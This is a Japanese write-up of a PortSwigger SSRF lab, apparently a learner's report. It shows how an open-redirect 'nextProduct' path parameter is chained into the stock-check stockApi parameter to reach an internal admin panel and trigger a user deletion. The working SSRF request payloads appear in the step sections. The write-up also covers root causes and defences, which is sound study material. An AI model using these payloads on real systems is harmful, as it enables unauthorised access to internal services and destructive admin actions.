# SSRF：オープンリダイレクトを利用したフィルター回避と内部管理機能へのアクセス

## 1. 検証概要

| 項目 | 内容 |
|---|---|
| 学習プラットフォーム | PortSwigger Web Security Academy |
| ラボ名 | SSRF with filter bypass via open redirection vulnerability |
| 難易度 | Practitioner |
| 分野 | Server-Side Request Forgery（SSRF） |
| 実施日 | 2026年11月5日 |
| 対象機能 | 商品在庫確認（`POST /product/stock`）、次の商品への移動（`GET /product/nextProduct`） |
| 使用ツール | Burp Suite Community Edition（Proxy / HTTP history、Repeater） |
| 検証結果 | LAB Solved |
| 理解度チェック | 第21ラボ専用の5問テストは未実施。URL構造の補習を実施 |

### 検証目的

商品在庫確認APIから内部サーバーへの直接アクセスが拒否される環境で、同一サイトのリダイレクト機能を経由し、HTTPクライアントに内部管理画面へアクセスさせられるか検証する。

**対象は許可されたPortSwiggerの学習ラボのみ。**

---

## 2. 実務上の攻撃シナリオ

### 2.1 想定するシステム

ECサイトが在庫確認のためサーバー側からHTTPリクエストを発行する。接続先の指定には `stockApi` パラメータを使用し、外部の任意URLへの直接アクセスは制限されている。一方、同サイト内に次の商品へ移動させるリダイレクト機能があり、`path` パラメータから転送先を指定できる。

さらに、一般利用者が直接接続できない内部ネットワークに管理画面が存在すると仮定する。

### 2.2 攻撃者の立場と目的

通常の商品ページを操作できる利用者が、在庫確認リクエストとページ遷移のリダイレクト機能を組み合わせ、内部管理画面へのアクセスや、管理機能へのリクエスト送信を狙う。

### 2.3 攻撃から被害までの流れ

1. 在庫確認リクエストに `stockApi` が存在することを確認する。
2. 内部管理画面のURLを直接指定するとHTTP 400が返り、処理が進まないことを確認する。
3. サイト内の `/product/nextProduct` に `path` で転送先を与えられること、HTTP 302の `Location` に反映されることを確認する。
4. `stockApi` にサイト内のリダイレクト機能を指定し、その `path` に内部管理画面のURLを与える。
5. 在庫確認処理が転送を追跡すると、内部管理画面のHTMLが在庫確認APIのレスポンスとして返される。
6. 管理操作への転送先を指定してリクエストを送信し、ラボのSolved表示を確認する。

### 2.4 想定被害・根本原因・対策

| 観点 | 内容 |
|---|---|
| 想定被害 | 内部管理画面の情報露出、アカウントの不正削除、サービス運用への影響、復旧・調査負担 |
| SSRFの根本原因 | 利用者が在庫確認サーバーの接続先を間接的に操作でき、リダイレクト後の最終的な接続先が適切に検証されていない |
| 成立を助ける要因 | `path` を任意URLにできるオープンリダイレクトと、HTTPクライアント側の転送追跡 |
| 防止策 | サーバー側で在庫サービスの宛先を固定、リダイレクト先も再検証、内部ネットワーク宛通信を制限、管理操作に認証・認可を必須化 |
| 検知策 | 在庫確認処理からの内部IP向け通信、外部URLを含む `path`、管理画面アクセスやユーザー削除の監査ログを関連付けて監視 |

**この節は実務上の想定であり、実在企業への影響を確認したものではない。**

---

## 3. 技術的背景

### 3.1 SSRF

Server-Side Request Forgery（SSRF）は、攻撃者が入力したURL等を利用し、Webアプリケーションのサーバーに想定外の宛先へHTTPリクエストを送信させる脆弱性。利用者自身が直接到達できない内部サービスでも、サーバーからは到達できる場合がある。

### 3.2 URLの構造

今回の内部管理画面は次のようなURL。

```text
http://192.168.0.12:8080/admin
       └─ ホスト ─┘└port┘└path┘
```

- `192.168.0.12`：接続先IPアドレス（内部ネットワーク上のホスト）
- `8080`：接続先サービスのポート番号
- `/admin`：サーバーへ要求するパス
- `?username=carlos`：削除機能に対象ユーザーを渡すクエリ文字列（最終操作で使用）

### 3.3 302とLocation

HTTP `302 Found` は別のURLへの一時的な転送を示す。`Location` は転送先を指定するレスポンスヘッダー。

HTTPクライアントが自動で転送を追跡する設定の場合、最初のアクセス先が許可されたパスでも、転送先で予期しない内部アドレスに接続するおそれがある。

### 3.4 オープンリダイレクト

転送先URLを利用者が自由に指定でき、外部・内部を含む望ましくない場所へ転送される実装上の問題。

今回の `/product/nextProduct` は `path` によって転送先を指定する。通常の「次の商品へ移動する」機能を、在庫確認処理を経由したSSRFの足掛かりとして利用した。

---

## 4. 検証手順とHTTP通信

### STEP 1：在庫確認リクエストを捕捉

商品ページで `Check stock` をクリックし、`POST /product/stock` をRepeaterに送った。

初期リクエスト本文：

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

URLデコードすると `/product/stock/check?productId=1&storeId=1` という相対パスになっている。

Cookie等のセッション秘密情報は記載しない。初期リクエストのHTTPレスポンス全文は未記録。

### STEP 2：内部管理画面への直接アクセスを試す

Repeaterの本文を変更。

```text
stockApi=http://192.168.0.12:8080/admin
```

**実際のレスポンス：**

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 48

"Invalid external stock check url 'Invalid URL'"
```

**観測できたこと：** URLの検証エラーで拒否された。**これだけで「内部IPを明示的にブラックリスト化している」とは断定できない**。URL解析や許容形式の詳細は未確認。

### STEP 3：次の商品へ移動する通信を確認

商品ページで `Next product` をクリック。HTTP historyで観測したリクエスト：

```http
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/2
```

HTTP historyにはResponseが表示されなかったため、このGETをRepeaterに送り直して確認した。

**Repeaterで実際に得たレスポンス：**

```http
HTTP/2 302 Found
Location: /product?productId=2
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

`path` で指定した `/product?productId=2` が、302の `Location` に使われていることを確認した。

### STEP 4：リダイレクト機能を在庫確認に指定する

`POST /product/stock` のRepeaterに戻り、本文を以下に変更。

```text
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

**実際のレスポンス（抜粋）：**

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3281
```

HTML本文の関連箇所：

```html
<a href="/admin">Admin panel</a>
<h1>Users</h1>
<div>
    <span>wiener - </span>
    <a href="/http://192.168.0.12:8080/admin/delete?username=wiener">Delete</a>
</div>
<div>
    <span>carlos - </span>
    <a href="/http://192.168.0.12:8080/admin/delete?username=carlos">Delete</a>
</div>
```

**実証：** 在庫確認リクエストを通じて、内部管理画面のユーザー一覧を含むHTMLが返された。

HTML中の `href="/http://..."` の形は実際の観測値を保持している。通常の絶対URL形式と異なるため、リンク表記だけを根拠にURL解釈や削除操作の成否を断定しない。

### STEP 5：管理機能への転送リクエスト

次の本文で `Send` を実行：

```text
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

その後、**LAB Solved** の画面を確認した。

**最終リクエストのHTTPレスポンス全文、サーバー側の削除処理の内部実装やDBの変更は未確認。**

---

## 5. 検証結果一覧

| 試行 | 確認した結果 |
|---|---|
| `stockApi=http://192.168.0.12:8080/admin` | HTTP 400、`Invalid URL` |
| `GET /product/nextProduct?currentProductId=1&path=/product?productId=2` | HTTP 302、`Location: /product?productId=2` |
| `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin` | HTTP 200、内部管理画面のHTMLを取得 |
| `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos` | 送信後、LAB Solved |

### 実証事項と考察の区別

- **実証**：直接URL指定はHTTP 400だった。
- **実証**：`nextProduct` の `path` を使った転送ではHTTP 302とLocationを確認した。
- **実証**：転送を組み合わせた在庫確認APIから、管理画面のHTMLをHTTP 200で取得できた。
- **実証**：削除を目的としたURLへのリクエスト送信後にSolvedを確認した。
- **技術的解釈**：在庫確認側のHTTPクライアントがリダイレクトを追い、最終接続先を適切に制限していなかったことが原因と考えられる。
- **未実証**：在庫確認処理とリダイレクト処理の内部ソースコード、通信ログ、最終レスポンス全文。

---

## 6. 根本原因と分析

### 6.1 最初の接続先しか検証しない問題

在庫確認APIが「自サイト内の相対パスならアクセス可能」と判断していても、そのページが302で内部IPへ転送するなら、**転送後のURLを再検証しなければ許可範囲を越える**。

### 6.2 複数の機能を組み合わせた脆弱性

今回のポイントは、在庫確認API単独やNext product単独ではなく、**2つの機能の組み合わせ**。

```text
利用者
  └─ POST /product/stock
       └─ stockApi=/product/nextProduct?path=...
            └─ GET /product/nextProduct へのアクセス
                 └─ HTTP 302 Location: 内部管理画面のURL
                      └─ HTTPクライアントが転送先にアクセス
                           └─ 管理画面HTMLが在庫確認APIから返る
```

これは観測結果を説明する概念的なフローであり、ラボの内部トレースを取得したものではない。

---

## 7. 推奨する防止策・検知策

1. **在庫確認先の固定**：`stockApi` に利用者指定の任意URLや任意パスを受け取らず、サーバー側で在庫サービスの接続先を決める。
2. **リダイレクト制限**：在庫照会用HTTPクライアントで、必要がなければ自動リダイレクトを無効化する。必要な場合は各転送先を許可リストで検証し直す。
3. **IP・ポートの検証**：DNS解決後の実際の接続先、ループバック、プライベートIP、ポート、スキーム、転送先を確認する。
4. **ネットワークの送信制御**：アプリケーションサーバーから管理ネットワークへの不要な通信を遮断する。
5. **Next productの転送先制限**：`path` を任意のURLへ転送できないようにし、必要な自サイト内の商品パスのみ許可する。
6. **内部管理機能の認可**：内部からの接続であっても、ユーザー削除等の重要操作には本人確認・権限チェックを実施する。
7. **監視**：在庫確認APIによる内部IPへの接続、異常な`path` 値、リダイレクトの連鎖、管理操作ログを突き合わせて調査する。

---

## 8. 実務上の想定影響

内部管理画面へのアクセス、非公開情報の取得、ユーザー管理機能の不正利用、サービス運用の妨害などが想定される。ただし、影響はサーバーの通信範囲・内部機能の認証認可・リダイレクト追跡の実装に依存する。

今回のラボで実在する第三者環境への影響を確認した事実はない。

---

## 9. 検証の限界

- 初期の在庫確認リクエストのレスポンス全文
- `stockApi` に絶対URLを許可しない内部実装の詳細
- 自動転送の実装と、転送先URLの検証有無のソースコード
- 302応答に続く通信の実際の内部ネットワークログ
- 最終削除リクエストのHTTPレスポンス全文
- データベース内の削除結果
- 他の内部ホスト・パスでの再現性
- 実務環境での影響

---

## 10. 学習状況と振り返り

### 第21ラボの理解度

第21ラボ専用の5問テストは実施していない。代わりにSSRFの理解に必要なURL構造の補習を行った。

- ポート `8080`：理解度チェック正解
- パス `/admin`：正解
- クエリ `?username=carlos`：正解
- `@` の前後の解釈：最初は誤答
- `#` によるフラグメント区切り：正解
- `%2523` を1回デコードすると `%23`：正解
- 前の第20ラボのホスト検証例 `stock.weliketoshop.net`：正解

**現時点の本人の理解：第20ラボと第21ラボの違いは理解できたが、URL解釈や通信の内部動作についてはまだ腹落ちしていない。**

### 今回つかんだポイント

- **第20ラボ**：URLの解析・デコードの食い違いによるホワイトリスト回避。
- **第21ラボ**：最初に許可されたページへのアクセスを、HTTP 302の転送で内部URLへの通信につなげる回避。
- GETでもサーバーからResponseは返る。今回、HTTP historyではResponseが空だったのでRepeaterで再送して302を観測した。
- HTTP 200のHTML内に管理ユーザーが現れたことは、内部管理画面への到達を示す重要な証拠。

**次の復習項目：** Request / Response、302 / Location、URLのホスト・ポート・パス・クエリ、リダイレクト追跡。現段階では公式Solutionの操作とHTTPレスポンス観察を継続する。

---

## 11. 参考資料

- [PortSwigger：SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
- [PortSwigger：Server-side request forgery](https://portswigger.net/web-security/ssrf)
- [OWASP：Server Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

※ 本レポートは、許可された学習用環境での検証結果を記録したもの。商用サービスへの脆弱性診断実績を示すものではない。